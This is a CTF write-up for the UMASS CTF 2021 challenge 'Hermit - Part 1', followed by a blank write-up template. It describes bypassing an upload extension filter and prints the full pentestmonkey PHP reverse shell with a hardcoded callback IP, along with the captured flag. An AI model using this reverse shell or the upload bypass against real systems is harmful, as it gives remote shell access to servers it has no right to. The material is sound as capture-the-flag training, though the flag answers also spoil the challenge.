# UMASS CTF 2021

[UMASS CTF 2021](https://ctf.umasscybersec.org/challenges#)
[CTF Time](https://ctftime.org/event/1282)

---

- [UMASS CTF 2021](#umass-ctf-2021)
  - [Hermit - Part 1 (HP1)](#hermit---part-1-hp1)
    - [Description - HP1](#description---hp1)
    - [Process - HP1](#process---hp1)
    - [Screen Grabs - HP1](#screen-grabs---hp1)
      - [User Shell - HP1](#user-shell---hp1)
      - [User Flag - HP1](#user-flag---hp1)
      - [Root LUL - HP1](#root-lul---hp1)
      - [Proof - HP1](#proof---hp1)
    - [Tools Used - HP1](#tools-used---hp1)
  - [Example Challenge Name (ECN1)](#example-challenge-name-ecn1)
    - [Description - ECN1](#description---ecn1)
    - [Process - ECN1](#process---ecn1)
    - [Screen Grabs - ECN1](#screen-grabs---ecn1)
    - [Tools User - ECN1](#tools-user---ecn1)

---

## Hermit - Part 1 (HP1)

### Description - HP1

Author: goproslowyo

This box was a simple extension filter bypass to gain a shell and get the flag.

### Process - HP1

1. Started `netcat` listener on `8001`.
2. Uploaded php reverse shell with an image extension -- `.png` worked fine.
3. We're given a random filename and a link to view it.
4. Viewing the link executed the reverse shell.
  `http://34.121.84.161:8086/show.php?filename=0YE8gg`.

```shell
hermit@aec9a5b5ef1d:/$ ls /home/hermit
ls /home/hermit
userflag.txt
hermit@aec9a5b5ef1d:/$ cat /home/hermit/userflag.txt
cat /home/hermit/userflag.txt
UMASS{a_picture_paints_a_thousand_shells}
```

### Screen Grabs - HP1

#### User Shell - HP1

![user shell](./assets/hp1/shell.png)

#### User Flag - HP1

![userflag.txt](./assets/hp1/flag.png)

#### Root LUL - HP1

![{a_test_of_integrity}](./assets/hp1/rootlol.png)

#### Proof - HP1

![proof](./assets/hp1/proof.png)

### Tools Used - HP1

1. [Pentest Monkey PHP Revshell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
set_time_limit(0);
$VERSION = "1.0";
$ip = '34.251.165.208';
$port = 8001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; whoami; /bin/bash -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
  $pid = pcntl_fork();
  if ($pid == -1) {
    printit("ERROR: Can't fork");
    exit(1);
  }
  if ($pid) {
    exit(0);  // Parent exits
  }
  if (posix_setsid() == -1) {
    printit("Error: Can't setsid()");
    exit(1);
  }
  $daemon = 1;
} else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
  printit("$errstr ($errno)");
  exit(1);
}
$descriptorspec = array(
  0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
  1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
  2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
  if (feof($sock)) {
    printit("ERROR: Shell connection terminated");
    break;
  }
  if (feof($pipes[1])) {
    printit("ERROR: Shell process terminated");
    break;
  }
  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }
  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }
  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit($string) {
  if (!$daemon) {
    print "$string\n";
  }
}
?>
```

---

template:

## Example Challenge Name (ECN1)

### Description - ECN1

Author: you

Quick overview of box, e.g. this box was a simple extension filter bypass to gain a shell and get the flag.

### Process - ECN1

1. Started `netcat` listener on `8001`.
2. Uploaded php reverse shell with an image extension -- `.png` worked fine.
3. We're given a random filename and a link to view it.
4. Viewing the link executed the reverse shell.
  `http://34.121.84.161:8086/show.php?filename=0YE8gg`.

```shell
hermit@aec9a5b5ef1d:/$ ls /home/hermit
ls /home/hermit
userflag.txt
hermit@aec9a5b5ef1d:/$ cat /home/hermit/userflag.txt
cat /home/hermit/userflag.txt
UMASS{a_picture_paints_a_thousand_shells}
```

### Screen Grabs - ECN1

![user shell](./assets/ECN1/shell.png)
![userflag.txt](./assets/ECN1/flag.png)
![{a_test_of_integrity}](./assets/ECN1/rootlol.png)
![proof](./assets/ECN1/proof.png)

### Tools User - ECN1

1. A tool [link](https://somewhere.local)
2. B Tool
3. C Tool
